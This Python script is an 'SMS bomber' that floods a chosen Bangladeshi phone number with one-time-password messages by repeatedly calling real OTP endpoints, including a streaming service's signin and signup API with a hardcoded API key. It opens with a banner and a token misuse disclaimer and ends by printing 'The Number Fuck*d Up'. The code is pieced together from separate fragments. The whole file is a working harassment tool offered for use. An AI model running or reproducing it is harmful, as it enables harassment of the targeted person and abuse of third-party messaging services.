#author mr onion
from tqdm import tqdm
import requests
print(f"###############  ##########")
print(f"###############  ########## ")
print(f"      ###        ##")
print(f"      ###        ##   ")
print(f"      ###        ##########")
print(f"      ###        ##########")
print(f"      ###                ## ")
print(f"      ###                ##")
print(f"      ###       ###########")
print(f"      ###       ###########")

print(f" ")
print(f"Don't missuse this tool")
print(f" ")
print(f"If you do it will be your own responsibilty")
print("")
print(f"Author:Mr Onion ")
print("")
print(f"Contact FB:https://www.facebook.com/mr.x3n0n/ ")
print("")
print("website:www.mronion420.000webhostapp.com")
print("")
print("Git Hub:www.github.com/mronion420")
print("_______________________________________________")
print(f" ")

import requests
from tqdm import tqdm
from requests.structures import CaseInsensitiveDict
number =str(input("Enter The Number:"))


url = "https://0yzk2chfm3.execute-api.ap-southeast-1.amazonaws.com/prod/user/otp"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data = """{\"mobile_number\":\"+88"""+number+"""\"}"""


resp = requests.post(url, headers=headers, data=data)
for i in tqdm(range(50)):
    resp = requests.post(url,headers=headers,data=data)
print(resp.status_code)

#!/usr/bin/env python3

import requests as rq

"""
SMS Bomber using Hoichoi SMS api
"""

def send(number):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+number,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  res = rq.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+number,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = rq.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
 
  sent, nsent = 0, 10
  for i in range(1, 10 + 1):
    try:
      if send(number):
        print(f"[ID: {i}] SMS Sent!")
        sent += 1
        nsent -= 1
      else:
        print(f"[ID: {i}] SMS Not Sent...")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total number: {10}\n[+] Sent: {sent}\n[-] Not Sent: {nsent}")

if __name__ == "__main__":
  main()
  
  
api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
for i in tqdm(range(20)):
    resp = requests.get(api)
    
print(f"The Number Fuck*d Up ")

print(f"The Number Fuck*d Up ")

print(f"The Number Fuck*d Up ")

#opensource you can copy or edit this tool 
#Thanks dear